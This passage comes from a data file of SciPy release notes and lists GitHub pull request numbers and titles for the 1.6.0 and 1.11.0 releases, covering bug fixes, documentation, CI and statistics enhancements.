fixes to dendrogram plotting\n* `12921 <https://github.com/scipy/scipy/pull/12921>`__: CI: don't run GitHub Actions on fork or in cron job\n* `12927 <https://github.com/scipy/scipy/pull/12927>`__: MAINT: rename integrate.simps to simpson\n* `12934 <https://github.com/scipy/scipy/pull/12934>`__: MAINT: rename trapz and cumtrapz to (cumulative\\_)trapezoid\n* `12936 <https://github.com/scipy/scipy/pull/12936>`__: MAINT: fix numerical precision in nct.stats\n* `12938 <https://github.com/scipy/scipy/pull/12938>`__: MAINT: fix linter on master\n* `12941 <https://github.com/scipy/scipy/pull/12941>`__: Update minimum AIX pinnings to match non AIX builds\n* `12955 <https://github.com/scipy/scipy/pull/12955>`__: BUG: Fixed wrong NaNs check in scipy.stats.weightedtau\n* `12958 <https://github.com/scipy/scipy/pull/12958>`__: ENH: stats: Implement _logpdf, _sf and _isf for nakagami.\n* `12962 <https://github.com/scipy/scipy/pull/12962>`__: Correcting that p should be in [0,1] for a variety of discrete...\n* `12964 <https://github.com/scipy/scipy/pull/12964>`__: BUG: added line.strip() to split_data_line()\n* `12968 <https://github.com/scipy/scipy/pull/12968>`__: ENH: stats: Use only an analytical formula or scalar root-finding...\n* `12971 <https://github.com/scipy/scipy/pull/12971>`__: MAINT: Declare support for Python 3.9\n* `12972 <https://github.com/scipy/scipy/pull/12972>`__: MAINT: Remove redundant Python < 3.6 code\n* `12980 <https://github.com/scipy/scipy/pull/12980>`__: DOC: Update documentation on optimize.rosen\n* `12983 <https://github.com/scipy/scipy/pull/12983>`__: ENH: improvements to stats.linregress\n* `12990 <https://github.com/scipy/scipy/pull/12990>`__: DOC: Clarify that using sos as output type for iirdesign can...\n* `12992 <https://github.com/scipy/scipy/pull/12992>`__: DOC: capitalization and formatting in lsmr\n* `12995 <https://github.com/scipy/scipy/pull/12995>`__: DOC: stats: Several documentation fixes.\n* `12996 <https://github.com/scipy/scipy/pull/12996>`__: BUG: Improve error messages for \\`range\\` arg of binned_statistic_dd\n* `12998 <https://github.com/scipy/scipy/pull/12998>`__: MAINT: approx_derivative with FP32 closes #12991\n* `13004 <https://github.com/scipy/scipy/pull/13004>`__: TST: isinstance(OptimizeResult.message, str) closes #13001\n* `13006 <https://github.com/scipy/scipy/pull/13006>`__: Keep correct dtype when loading empty mat arrays.\n* `13009 <https://github.com/scipy/scipy/pull/13009>`__: MAINT: clip SLSQP step within bounds\n* `13012 <https://github.com/scipy/scipy/pull/13012>`__: DOC: fix bilinear_zpk example labels\n* `13013 <https://github.com/scipy/scipy/pull/13013>`__: ENH: Add \\`subset\\` and \\`subsets\\` methods to \\`DisjointSet\\`...\n* `13029 <https://github.com/scipy/scipy/pull/13029>`__: MAINT: basinhopping callback for initial mininmisation\n* `13032 <https://github.com/scipy/scipy/pull/13032>`__: DOC: fix docstring errors in in stats.wilcoxon\n* `13036 <https://github.com/scipy/scipy/pull/13036>`__: BUG: forward port lint_diff shims\n* `13041 <https://github.com/scipy/scipy/pull/13041>`__: MAINT: dogbox ensure x is within bounds closes #11403\n* `13042 <https://github.com/scipy/scipy/pull/13042>`__: MAINT: forward port 1.5.4 release notes\n* `13046 <https://github.com/scipy/scipy/pull/13046>`__: DOC: Update optimize.least_squares doc for all tolerance must...\n* `13052 <https://github.com/scipy/scipy/pull/13052>`__: Typo fix for cluster documentation\n* `13054 <https://github.com/scipy/scipy/pull/13054>`__: BUG: fix \\`scipy.optimize.show_options\\` for unknown methods....\n* `13056 <https://github.com/scipy/scipy/pull/13056>`__: MAINT: fft: Fix a C++ compiler warning.\n* `13057 <https://github.com/scipy/scipy/pull/13057>`__: Minor fixes on doc of function csr_tocsc\n* `13058 <https://github.com/scipy/scipy/pull/13058>`__: DOC: stats: Replace np.float with np.float64 in a tutorial file.\n* `13059 <https://github.com/scipy/scipy/pull/13059>`__: DOC: stats: Update the \"Returns\" section of the linregress docstring.\n* `13060 <https://github.com/scipy/scipy/pull/13060>`__: MAINT: clip_x_for_func should be private\n* `13061 <https://github.com/scipy/scipy/pull/13061>`__: DOC: signal.win -> signal.windows.win in Examples\n* `13063 <https://github.com/scipy/scipy/pull/13063>`__: MAINT: Add suite-sparse and sksparse installation check\n* `13070 <https://github.com/scipy/scipy/pull/13070>`__: MAINT: stats: Remove a couple obsolete comments.\n* `13073 <https://github.com/scipy/scipy/pull/13073>`__: BUG: Fix scalar_search_wolfe2 to resolve #12157\n* `13078 <https://github.com/scipy/scipy/pull/13078>`__: CI, MAINT: migrate Lint to Azure\n* `13081 <https://github.com/scipy/scipy/pull/13081>`__: BLD: drop Python 3.6 support (NEP 29)\n* `13082 <https://github.com/scipy/scipy/pull/13082>`__: MAINT: update minimum NumPy version to 1.16.5 in a couple more...\n* `13083 <https://github.com/scipy/scipy/pull/13083>`__: DOC: update toolchain.rst\n* `13086 <https://github.com/scipy/scipy/pull/13086>`__: DOC: Update the Parameters section of the correlation docstring\n* `13087 <https://github.com/scipy/scipy/pull/13087>`__: ENH:signal: Speed-up Cython implementation of _sosfilt\n* `13089 <https://github.com/scipy/scipy/pull/13089>`__: BLD, BUG: add c99 compiler flag to HiGHS basiclu library\n* `13091 <https://github.com/scipy/scipy/pull/13091>`__: BUG: Fix GIL handling in _sosfilt\n* `13094 <https://github.com/scipy/scipy/pull/13094>`__: DOC: clarify \"location\" in docstring of cKDTree.query\n* `13095 <https://github.com/scipy/scipy/pull/13095>`__: Zoom resize update\n* `13097 <https://github.com/scipy/scipy/pull/13097>`__: BUG: fix CubicSpline(..., bc_type=\"periodic\") #11758\n* `13100 <https://github.com/scipy/scipy/pull/13100>`__: BUG: sparse: Correct output format of kron\n* `13107 <https://github.com/scipy/scipy/pull/13107>`__: ENH: faster linear_sum_assignment for small cost matrices\n* `13110 <https://github.com/scipy/scipy/pull/13110>`__: CI, MAINT: refguide/asv checks to azure\n* `13112 <https://github.com/scipy/scipy/pull/13112>`__: CI: fix MacOS CI\n* `13113 <https://github.com/scipy/scipy/pull/13113>`__: CI: Install word list package for refguide-check\n* `13115 <https://github.com/scipy/scipy/pull/13115>`__: BUG: add value range check for signal.iirdesign()\n* `13116 <https://github.com/scipy/scipy/pull/13116>`__: CI: Don't report name errors after an exception in refguide-check\n* `13117 <https://github.com/scipy/scipy/pull/13117>`__: CI: move sdist/pre-release test Azure\n* `13119 <https://github.com/scipy/scipy/pull/13119>`__: Improve error message on friedmanchisquare function\n* `13121 <https://github.com/scipy/scipy/pull/13121>`__: Fix factorial() for NaN on Python 3.10\n* `13123 <https://github.com/scipy/scipy/pull/13123>`__: BLD: Specify file extension for language standard version tests\n* `13128 <https://github.com/scipy/scipy/pull/13128>`__: TST: skip Fortran I/O test for ODR\n* `13130 <https://github.com/scipy/scipy/pull/13130>`__: TST: skip factorial() float tests on Python 3.10\n* `13136 <https://github.com/scipy/scipy/pull/13136>`__: CI:Add python dbg run to GH Actions\n* `13138 <https://github.com/scipy/scipy/pull/13138>`__: CI: Port coverage, 64-bit BLAS, GCC 4.8 build to azure\n* `13139 <https://github.com/scipy/scipy/pull/13139>`__: Fix edge case for mode='nearest' in ndimage.interpolation functions\n* `13141 <https://github.com/scipy/scipy/pull/13141>`__: BUG: signal: Fix data type of the numerator returned by ss2tf.\n* `13144 <https://github.com/scipy/scipy/pull/13144>`__: MAINT: stats: restrict gausshyper z > -1\n* `13146 <https://github.com/scipy/scipy/pull/13146>`__: typo in csr.py\n* `13148 <https://github.com/scipy/scipy/pull/13148>`__: BUG: stats: fix typo in stable rvs per gh-12870\n* `13149 <https://github.com/scipy/scipy/pull/13149>`__: DOC: spatial/stats: cross-ref random rotation matrix functions\n* `13151 <https://github.com/scipy/scipy/pull/13151>`__: MAINT: stats: Fix a test and a couple PEP-8 issues.\n* `13152 <https://github.com/scipy/scipy/pull/13152>`__: MAINT: stats: Use np.take_along_axis in the private function...\n* `13154 <https://github.com/scipy/scipy/pull/13154>`__: ENH: stats: Implement defined handling of constant inputs in...\n* `13156 <https://github.com/scipy/scipy/pull/13156>`__: DOC: maintain equal display range for ndimage.zoom example\n* `13159 <https://github.com/scipy/scipy/pull/13159>`__: CI: Azure: Don't run tests on merge commits, except for coverage\n* `13160 <https://github.com/scipy/scipy/pull/13160>`__: DOC: stats: disambiguate location-shifted/noncentral\n* `13161 <https://github.com/scipy/scipy/pull/13161>`__: BUG: DifferentialEvolutionSolver.__del__ can fail in garbage...\n* `13163 <https://github.com/scipy/scipy/pull/13163>`__: BUG: stats: fix bug in spearmanr nan propagation\n* `13167 <https://github.com/scipy/scipy/pull/13167>`__: MAINT: stats: Fix a test.\n* `13169 <https://github.com/scipy/scipy/pull/13169>`__: BUG: stats: Fix handling of misaligned masks in mstats.pearsonr.\n* `13178 <https://github.com/scipy/scipy/pull/13178>`__: CI: testing.yml --> macos.yml\n* `13181 <https://github.com/scipy/scipy/pull/13181>`__: CI: fix lint\n* `13190 <https://github.com/scipy/scipy/pull/13190>`__: BUG: optimize: fix a duplicate key bug for \\`test_show_options\\`\n* `13192 <https://github.com/scipy/scipy/pull/13192>`__: BUG:linalg: Add overwrite option to gejsv wrapper\n* `13194 <https://github.com/scipy/scipy/pull/13194>`__: BUG: slsqp should be able to use rel_step\n* `13199 <https://github.com/scipy/scipy/pull/13199>`__: [skip travis] DOC: 1.6.0 release notes\n* `13203 <https://github.com/scipy/scipy/pull/13203>`__: fix typos\n* `13209 <https://github.com/scipy/scipy/pull/13209>`__: TST:linalg: set the seed for cossin test\n* `13212 <https://github.com/scipy/scipy/pull/13212>`__: [DOC] Backtick and directive consistency.\n* `13217 <https://github.com/scipy/scipy/pull/13217>`__: REL: add necessary setuptools and numpy version pins in pyproject.toml...\n* `13226 <https://github.com/scipy/scipy/pull/13226>`__: BUG: pavement.py file handle fixes\n* `13249 <https://github.com/scipy/scipy/pull/13249>`__: Handle cval correctly for ndimage functions with complex-valued...\n* `13253 <https://github.com/scipy/scipy/pull/13253>`__: BUG,MAINT: Ensure all Pool objects are closed\n* `13255 <https://github.com/scipy/scipy/pull/13255>`__: BUG:linalg: Fix heevx wrappers and add new tests\n* `13260 <https://github.com/scipy/scipy/pull/13260>`__: CI: fix macOS testing\n* `13269 <https://github.com/scipy/scipy/pull/13269>`__: CI: github actions: In the linux dbg tests, update apt before...\n* `13279 <https://github.com/scipy/scipy/pull/13279>`__: MAINT: 1.6.0 rc2 backports\n\n\n==========================\n", "1.11.0": "************************\n\n* `8727 <https://github.com/scipy/scipy/pull/8727>`__: BUG: vq.kmeans() compares signed diff to a threshold.\n* `12787 <https://github.com/scipy/scipy/pull/12787>`__: ENH: add anderson darling test for weibull #10829\n* `13699 <https://github.com/scipy/scipy/pull/13699>`__: ENH: stats: Add handling of censored data to univariate cont....\n* `14069 <https://github.com/scipy/scipy/pull/14069>`__: Use warnings instead of print statements\n* `15073 <https://github.com/scipy/scipy/pull/15073>`__: TST/MAINT: Parametrize \\`_METRICS_NAMES\\` & replace \\`assert_raises\\`...\n* `15841 <https://github.com/scipy/scipy/pull/15841>`__: Overhaul \\`factorial{,2,k}\\`: API coherence, bug fixes & consistent...\n* `15873 <https://github.com/scipy/scipy/pull/15873>`__: DEP: remove sym_pos argument from linalg.solve\n* `15877 <https://github.com/scipy/scipy/pull/15877>`__: DEP: remove extradoc in _distn_infrastructure\n* `15929 <https://github.com/scipy/scipy/pull/15929>`__: DEP: \\`lsim2\\` deprecated in favor of \\`lsim\\`\n* `15958 <https://github.com/scipy/scipy/pull/15958>`__: CI: move \\`prerelease_deps_coverage_64bit_blas\\` to GitHub actions.\n* `16071 <https://github.com/scipy/scipy/pull/16071>`__: ENH: Add missing \"characteristic impedance of vacuum\"\n* `16313 <https://github.com/scipy/scipy/pull/16313>`__: MAINT: Update optimize.shgo\n* `16782 <https://github.com/scipy/scipy/pull/16782>`__: ENH: stats: optimised fit for the truncated Pareto distribution\n* `16839 <https://github.com/scipy/scipy/pull/16839>`__: ENH: stats: optimised MLE for the lognormal distribution\n* `16936 <https://github.com/scipy/scipy/pull/16936>`__: BUG: sparse: fix argmin/argmax when all entries are nonzero\n* `16961 <https://github.com/scipy/scipy/pull/16961>`__: ENH: optimize: Add \\`nan_policy\\` optional argument for \\`curve_fit\\`.\n* `16996 <https://github.com/scipy/scipy/pull/16996>`__: ENH: stats.anderson_ksamp: add permutation version of test\n* `17116 <https://github.com/scipy/scipy/pull/17116>`__: MAINT: Adjust Pull-Request labeler configuration\n* `17208 <https://github.com/scipy/scipy/pull/17208>`__: DOC: Add triage guide\n* `17211 <https://github.com/scipy/scipy/pull/17211>`__: ENH: Implemented Dirichlet-multinomial distribution (#16810)\n* `17212 <https://github.com/scipy/scipy/pull/17212>`__: Guard against integer overflows in fitpackmodule.c\n* `17235 <https://github.com/scipy/scipy/pull/17235>`__: MAINT: pass check_finite to the vq() call of kmeans2()\n* `17267 <https://github.com/scipy/scipy/pull/17267>`__: DOC/MAINT: special: Several updates for tklmbda\n* `17268 <https://github.com/scipy/scipy/pull/17268>`__: DOC: special: Show that lambertw can solve x = a + b\\*exp(c\\*x)\n* `17287 <https://github.com/scipy/scipy/pull/17287>`__: DOC: Clarify minimum_spanning_tree behavior in non-connected...\n* `17310 <https://github.com/scipy/scipy/pull/17310>`__: DOC: missing-bits: document recommendations on return object...\n* `17322 <https://github.com/scipy/scipy/pull/17322>`__: DOC: Add notebook infrastructure for the docs\n* `17326 <https://github.com/scipy/scipy/pull/17326>`__: ENH: Clarify the index of element corresponding to a label in...\n* `17334 <https://github.com/scipy/scipy/pull/17334>`__: ENH: Map the rotation quaternion double cover of rotation space...\n* `17402 <https://github.com/scipy/scipy/pull/17402>`__: ENH: stats: add false discovery rate control function\n* `17410 <https://github.com/scipy/scipy/pull/17410>`__: ENH: stats.multivariate_t: add cdf method\n* `17432 <https://github.com/scipy/scipy/pull/17432>`__: BLD: Boost.Math standalone submodule\n* `17451 <https://github.com/scipy/scipy/pull/17451>`__: DEP: Remove \\`vertices\\` in qhull.\n* `17455 <https://github.com/scipy/scipy/pull/17455>`__: Deprecate scipy.signal.{bspline, quadratic, cubic}\n* `17479 <https://github.com/scipy/scipy/pull/17479>`__: ENH: Add new SI prefixes\n* `17480 <https://github.com/scipy/scipy/pull/17480>`__: ENH: stats: Implement _sf and _isf for halfnorm, gibrat, gompertz.\n* `17483 <https://github.com/scipy/scipy/pull/17483>`__: MAINT: optimize.basinhopping: fix acceptance of failed local...\n* `17486 <https://github.com/scipy/scipy/pull/17486>`__: ENH: optimize.minimize: callback enhancements\n* `17499 <https://github.com/scipy/scipy/pull/17499>`__: MAINT: remove use of \\`NPY_UPDATEIFCOPY\\`\n* `17505 <https://github.com/scipy/scipy/pull/17505>`__: ENH: Add relativistic Breit-Wigner Distribution\n* `17529 <https://github.com/scipy/scipy/pull/17529>`__: ENH: stats: Implement powerlaw._sf\n* `17531 <https://github.com/scipy/scipy/pull/17531>`__: TST: scipy.signal.order_filter: add test coverage\n* `17535 <https://github.com/scipy/scipy/pull/17535>`__: MAINT: special: Improve comments about Cephes p1evl function.\n* `17538 <https://github.com/scipy/scipy/pull/17538>`__: ENH: Extending _distance_pybind with additional distance metrics...\n* `17541 <https://github.com/scipy/scipy/pull/17541>`__: REL: set version to 1.11.0.dev0\n* `17553 <https://github.com/scipy/scipy/pull/17553>`__: DOC: optimize.curve_fit: add note about \\`pcov\\` condition number\n* `17555 <https://github.com/scipy/scipy/pull/17555>`__: DEP: stats: removal of kwargs n in stats.moment and alpha in...\n* `17556 <https://github.com/scipy/scipy/pull/17556>`__: DEV: bump flake8 version used in CI job\n* `17557 <https://github.com/scipy/scipy/pull/17557>`__: MAINT: bump Ubuntu version in Azure CI\n* `17561 <https://github.com/scipy/scipy/pull/17561>`__: MAINT: stats.mode: remove deprecated features, smooth edges\n* `17562 <https://github.com/scipy/scipy/pull/17562>`__: ENH: stats: Implement _ppf for the betaprime distribution.\n* `17563 <https://github.com/scipy/scipy/pull/17563>`__: DEP: stats: remove misspelt gilbrat distribution\n* `17566 <https://github.com/scipy/scipy/pull/17566>`__: DOC: correct, update, and extend \\`lobpcg\\` docstring info and...\n* `17567 <https://github.com/scipy/scipy/pull/17567>`__: MAINT: Update gitpod setup\n* `17573 <https://github.com/scipy/scipy/pull/17573>`__: DOC: Update testing documentation to dev.py\n* `17574 <https://github.com/scipy/scipy/pull/17574>`__: MAINT: clean up \\`NPY_OLD\\` usage in Cython code and build files\n* `17581 <https://github.com/scipy/scipy/pull/17581>`__: DOC fix trivial typo in description of loggamma in _add_newdocs.py\n* `17585 <https://github.com/scipy/scipy/pull/17585>`__: ENH: Von Mises distribution fit\n* `17587 <https://github.com/scipy/scipy/pull/17587>`__: BUG: stats: Avoid overflow/underflow issues in loggamma _cdf,...\n* `17589 <https://github.com/scipy/scipy/pull/17589>`__: BUG: FutureWarning in distance_transform_cdt\n* `17590 <https://github.com/scipy/scipy/pull/17590>`__: DEP: raise on >1-dim inputs for optimize.minimize\n* `17595 <https://github.com/scipy/scipy/pull/17595>`__: DOC: optimize.line_search: note that \\`pk\\` must be a descent...\n* `17597 <https://github.com/scipy/scipy/pull/17597>`__: DOC: Add Legacy directive\n* `17603 <https://github.com/scipy/scipy/pull/17603>`__: DEP: remove spatial.distance.kulsinski\n* `17605 <https://github.com/scipy/scipy/pull/17605>`__: DOC: example of epidemic model with LHS\n* `17608 <https://github.com/scipy/scipy/pull/17608>`__: DOC: curve_fit - clarify fvec output\n* `17610 <https://github.com/scipy/scipy/pull/17610>`__: DOC: add example to chi2_contingency\n* `17613 <https://github.com/scipy/scipy/pull/17613>`__: DOC: curve_fit, include sigma\n* `17615 <https://github.com/scipy/scipy/pull/17615>`__: MAINT: scipy.optimize.root: fix error when both args and jac...\n* `17616 <https://github.com/scipy/scipy/pull/17616>`__: MAINT: optimize.minimize: enhance \\`callback\\` for remaining...\n* `17617 <https://github.com/scipy/scipy/pull/17617>`__: DEP: remove MaximumFlowResult.residual\n* `17618 <https://github.com/scipy/scipy/pull/17618>`__: DOC: fix unicode in qmc example\n* `17622 <https://github.com/scipy/scipy/pull/17622>`__: MAINT: optimize.root_scalar: raise when NaN is encountered\n* `17624 <https://github.com/scipy/scipy/pull/17624>`__: ENH: add von Mises-Fisher distribution\n* `17625 <https://github.com/scipy/scipy/pull/17625>`__: DOC: Examples for special functions related to the student t...\n* `17626 <https://github.com/scipy/scipy/pull/17626>`__: DOC: improve docstrings of exp. scaled Bessel functions\n* `17628 <https://github.com/scipy/scipy/pull/17628>`__: ENH: add Sobol' indices\n* `17629 <https://github.com/scipy/scipy/pull/17629>`__: DOC: stats: example treatment odd_ratio\n* `17637 <https://github.com/scipy/scipy/pull/17637>`__: DEP: switch default of special.comb to legacy=False\n* `17643 <https://github.com/scipy/scipy/pull/17643>`__: TST: interpolate/rgi: Add tests for descending ordered points\n* `17649 <https://github.com/scipy/scipy/pull/17649>`__: fix documentation lines\n* `17651 <https://github.com/scipy/scipy/pull/17651>`__: Update _svds.py removing no longer necessary QR for LOBPCG output\n* `17654 <https://github.com/scipy/scipy/pull/17654>`__: MAINT:interpolate:Add .c file to .gitignore\n* `17655 <https://github.com/scipy/scipy/pull/17655>`__: DEV: add check for misnamed tests\n* `17657 <https://github.com/scipy/scipy/pull/17657>`__: DEV: streamline OpenBLAS handling on Win machine\n* `17660 <https://github.com/scipy/scipy/pull/17660>`__: MAINT: optimize.newton: converged=False when secant has zero...\n* `17663 <https://github.com/scipy/scipy/pull/17663>`__: DOC: optimize.curve_fit: example output may vary\n* `17664 <https://github.com/scipy/scipy/pull/17664>`__: MAINT: optimize.root_scalar: fix underflow sign check bug\n* `17665 <https://github.com/scipy/scipy/pull/17665>`__: DOC: mention inaccuracy of curve_fit result \\`pcov\\`\n* `17666 <https://github.com/scipy/scipy/pull/17666>`__: DOC: optimize.root_scalar: harmonize documentation and implementation...\n* `17668 <https://github.com/scipy/scipy/pull/17668>`__: ENH: stats.loguniform: reformulate methods to avoid overflow\n* `17669 <https://github.com/scipy/scipy/pull/17669>`__: MAINT: optimize.newton: avoid error with complex \\`x0\\`\n* `17674 <https://github.com/scipy/scipy/pull/17674>`__: DOC: optimize: add tutorial example of passing kwargs to callable\n* `17675 <https://github.com/scipy/scipy/pull/17675>`__: ENH: update lobpcg.py\n* `17676 <https://github.com/scipy/scipy/pull/17676>`__: BUG: correctly handle array-like types in scipy.io.savemat\n* `17678 <https://github.com/scipy/scipy/pull/17678>`__: DOC: optimize: show how memoization avoids duplicating work\n* `17679 <https://github.com/scipy/scipy/pull/17679>`__: ENH: optimize.minimize: add bound constraints to COBYLA\n* `17680 <https://github.com/scipy/scipy/pull/17680>`__: DOC: examples for special functions related to neg. binomial...\n* `17682 <https://github.com/scipy/scipy/pull/17682>`__: DOC: add real example for \\`stats.chisquare\\`\n* `17684 <https://github.com/scipy/scipy/pull/17684>`__: ENH: support \\`Bounds\\` class in lsq_linear\n* `17685 <https://github.com/scipy/scipy/pull/17685>`__: ENH: stats: Implement _sf for the foldnorm distribution.\n* `17687 <https://github.com/scipy/scipy/pull/17687>`__: MAINT: optimize.toms748: correct \"rtol too small\" message\n* `17688 <https://github.com/scipy/scipy/pull/17688>`__: MAINT: optimize.curve_fit: memoize \\`f\\` and \\`jac\\`\n* `17691 <https://github.com/scipy/scipy/pull/17691>`__: ENH: optimize.root_scalar: allow newton without f', secant without...\n* `17692 <https://github.com/scipy/scipy/pull/17692>`__: MAINT: optimize.minimize_scalar: enforce output shape consistency\n* `17693 <https://github.com/scipy/scipy/pull/17693>`__: DOC: pointbiserialr correlation formula notation fix.\n* `17694 <https://github.com/scipy/scipy/pull/17694>`__: ENH: stats: Implement _sf and _isf for halfcauchy; _sf for foldcauchy\n* `17698 <https://github.com/scipy/scipy/pull/17698>`__: MAINT: implicit float conversion in rgi test\n* `17700 <https://github.com/scipy/scipy/pull/17700>`__: ENH: Inverse wishart entropy\n* `17701 <https://github.com/scipy/scipy/pull/17701>`__: DOC: stats: Fix a reference for the genexpon distribution.\n* `17702 <https://github.com/scipy/scipy/pull/17702>`__: DOC: stats: complete references and links for descriptive stats\n* `17704 <https://github.com/scipy/scipy/pull/17704>`__: MAINT: optimize.bracket: don't fail silently\n* `17705 <https://github.com/scipy/scipy/pull/17705>`__: DOC: optimize.minimize_scalar and friends: correct documentation...\n* `17707 <https://github.com/scipy/scipy/pull/17707>`__: DOC: add acetazolamide example to \\`stats.fisher_exact\\`\n* `17708 <https://github.com/scipy/scipy/pull/17708>`__: ENH: stats: Implement _ppf and _isf for genexpon.\n* `17709 <https://github.com/scipy/scipy/pull/17709>`__: MAINT: update copyright date\n* `17711 <https://github.com/scipy/scipy/pull/17711>`__: MAINT: forward port 1.10.0 relnotes\n* `17714 <https://github.com/scipy/scipy/pull/17714>`__: ENH: Provide public API for fast DisjointSet subset size.\n* `17724 <https://github.com/scipy/scipy/pull/17724>`__: DOC: spatial: Several updates:\n* `17729 <https://github.com/scipy/scipy/pull/17729>`__: STY: fix unicode error\n* `17730 <https://github.com/scipy/scipy/pull/17730>`__: MAINT: rotate CircleCI ssh key\n* `17732 <https://github.com/scipy/scipy/pull/17732>`__: MAINT: optimize.toms748: don't do newton after secant interpolation\n* `17742 <https://github.com/scipy/scipy/pull/17742>`__: ENH: override _entropy for beta, chi and chi2 distributions\n* `17747 <https://github.com/scipy/scipy/pull/17747>`__: DOC: stats.jarque_bera: add semi-realistic example\n* `17750 <https://github.com/scipy/scipy/pull/17750>`__: ENH: Support multinomial distributions with n=0 trials.\n* `17758 <https://github.com/scipy/scipy/pull/17758>`__: ENH: analytical formula for f distribution entropy\n* `17759 <https://github.com/scipy/scipy/pull/17759>`__: DOC: stats.skewtest: add semi-realistic example\n* `17762 <https://github.com/scipy/scipy/pull/17762>`__: DOC: remove space between directive name and double colon ``::``\n* `17763 <https://github.com/scipy/scipy/pull/17763>`__: DOC: single -> double colon for directive.\n* `17764 <https://github.com/scipy/scipy/pull/17764>`__: ENH: entropy for matrix normal distribution\n* `17765 <https://github.com/scipy/scipy/pull/17765>`__: DOC: stats: additional normality test examples\n* `17767 <https://github.com/scipy/scipy/pull/17767>`__: DOC: stats: reorganize hypothesis tests in main page\n* `17768 <https://github.com/scipy/scipy/pull/17768>`__: TST: special: fix incorrectly named tests\n* `17769 <https://github.com/scipy/scipy/pull/17769>`__: DOC/BUG: add missing entropy methods in docstrings\n* `17770 <https://github.com/scipy/scipy/pull/17770>`__: TST: stats: fixed misnamed tests\n* `17772 <https://github.com/scipy/scipy/pull/17772>`__: MAINT: remove unused test utility functions\n* `17773 <https://github.com/scipy/scipy/pull/17773>`__: DOC: stats: add realistic examples to correlation tests\n* `17778 <https://github.com/scipy/scipy/pull/17778>`__: DOC: stats: add realistic examples to variance tests\n* `17780 <https://github.com/scipy/scipy/pull/17780>`__: MAINT: optimize.minimize: fix new callback interface when parameter...\n* `17784 <https://github.com/scipy/scipy/pull/17784>`__: DOC: linalg: fix docstring of \\`linalg.sqrtm\\`\n* `17786 <https://github.com/scipy/scipy/pull/17786>`__: DOC: examples for ndtr, ndtri\n* `17791 <https://github.com/scipy/scipy/pull/17791>`__: DEP: remove maxiter kwarg in _minimize_tnc\n* `17793 <https://github.com/scipy/scipy/pull/17793>`__: MAINT: remove divide by zero in differential_evolution\n* `17794 <https://github.com/scipy/scipy/pull/17794>`__: TST: Added test suite for dgamma distribution\n* `17812 <https://github.com/scipy/scipy/pull/17812>`__: MAINT: add (optional) pre-commit hook\n* `17813 <https://github.com/scipy/scipy/pull/17813>`__: MAINT: integrate.qmc_quad: re-introduce qmc_quad\n* `17816 <https://github.com/scipy/scipy/pull/17816>`__: MAINT: allow typed method in \\`stats.sobol_indices\\`\n* `17817 <https://github.com/scipy/scipy/pull/17817>`__: MAINT: remove unused args parameter from \\`qmc_quad\\`\n* `17818 <https://github.com/scipy/scipy/pull/17818>`__: BUG/ENH: stats: several updates for dgamma.\n* `17820 <https://github.com/scipy/scipy/pull/17820>`__: DOC/BUG: plot \\`ndtri\\` only where it is defined\n* `17824 <https://github.com/scipy/scipy/pull/17824>`__: ENH: analytical entropy for invgauss distribution\n* `17825 <https://github.com/scipy/scipy/pull/17825>`__: DOC: optimize: change term zero to root\n* `17829 <https://github.com/scipy/scipy/pull/17829>`__: DOC: stats: document RNG behavior when distribution is deepcopied\n* `17830 <https://github.com/scipy/scipy/pull/17830>`__: MAINT: stats._axis_nan_policy: raise appropriate TypeErrors\n* `17834 <https://github.com/scipy/scipy/pull/17834>`__: MAINT: improve accuracy of betaprime cdf in scipy.stats\n* `17835 <https://github.com/scipy/scipy/pull/17835>`__: DOC: integrate: document limitation of numerical integration\n* `17836 <https://github.com/scipy/scipy/pull/17836>`__: DOC: integrate.solve_ivp: clarify impact of parameter \\`vectorized\\`\n* `17837 <https://github.com/scipy/scipy/pull/17837>`__: DEP: integrate.nquad: deprecate parameter \\`full_output\\`\n* `17838 <https://github.com/scipy/scipy/pull/17838>`__: DOC: integrate.quad: behavior is not guaranteed for divergent...\n* `17841 <https://github.com/scipy/scipy/pull/17841>`__: DOC: linalg: expand pinv example\n* `17842 <https://github.com/scipy/scipy/pull/17842>`__: DOC, MAINT: Add issue template for Documentation issues\n* `17848 <https://github.com/scipy/scipy/pull/17848>`__: ENH: implement _sf and _isf for powernorm distribution\n* `17849 <https://github.com/scipy/scipy/pull/17849>`__: ENH: special: Add the function _scaled_exp1\n* `17852 <https://github.com/scipy/scipy/pull/17852>`__: MAINT: optimize: improve \\`optimize.curve_fit\\` doc and error...\n* `17853 <https://github.com/scipy/scipy/pull/17853>`__: DOC: integrate.dblquad/tplquad: update result descriptions\n* `17857 <https://github.com/scipy/scipy/pull/17857>`__: MAINT: analytical formula for genlogistic entropy\n* `17865 <https://github.com/scipy/scipy/pull/17865>`__: MAINT: stats: fix recent CI and other issues\n* `17867 <https://github.com/scipy/scipy/pull/17867>`__: DOC: note on negative variables for linprog\n* `17868 <https://github.com/scipy/scipy/pull/17868>`__: ENH: add analytical formula for Nakagami distribution entropy\n* `17873 <https://github.com/scipy/scipy/pull/17873>`__: ENH: Added analytical formula for dgamma distribution entropy...\n* `17874 <https://github.com/scipy/scipy/pull/17874>`__: ENH: Added analytical formula for truncnorm entropy (#17748)\n* `17876 <https://github.com/scipy/scipy/pull/17876>`__: DOC: remove hidden stats sections from sidebar/toctree\n* `17878 <https://github.com/scipy/scipy/pull/17878>`__: Lint everything\n* `17879 <https://github.com/scipy/scipy/pull/17879>`__: DOC: add docs for the main namespace\n* `17881 <https://github.com/scipy/scipy/pull/17881>`__: BUG: Fix handling on user-supplied filters in \\`signal.decimate\\`\n* `17882 <https://github.com/scipy/scipy/pull/17882>`__: BLD: fix Meson build warnings about multiple targets\n* `17883 <https://github.com/scipy/scipy/pull/17883>`__: DOC: Clarified the meaning of optional arguments in optimize.leastsq\n* `17886 <https://github.com/scipy/scipy/pull/17886>`__: ENH: Warn about missing boundary when NOLA condition failed in...\n* `17889 <https://github.com/scipy/scipy/pull/17889>`__: DOC: Cleanup development guide\n* `17892 <https://github.com/scipy/scipy/pull/17892>`__: MAINT: stats: Post-\"lint everything\" clean up in stats.\n* `17894 <https://github.com/scipy/scipy/pull/17894>`__: MAINT: update .gitignore with meson and linter\n* `17895 <https://github.com/scipy/scipy/pull/17895>`__: DOC: config info in issue template\n* `17897 <https://github.com/scipy/scipy/pull/17897>`__: MAINT: Update the \"lint everything\" SHA in .git-blame-ignore-revs\n* `17898 <https://github.com/scipy/scipy/pull/17898>`__: DOC: remove hidden submodules from sidebar\n* `17899 <https://github.com/scipy/scipy/pull/17899>`__: MAINT: use conda for linters\n* `17900 <https://github.com/scipy/scipy/pull/17900>`__: Re-implement pre-commit hook in Python\n* `17906 <https://github.com/scipy/scipy/pull/17906>`__: DOC: 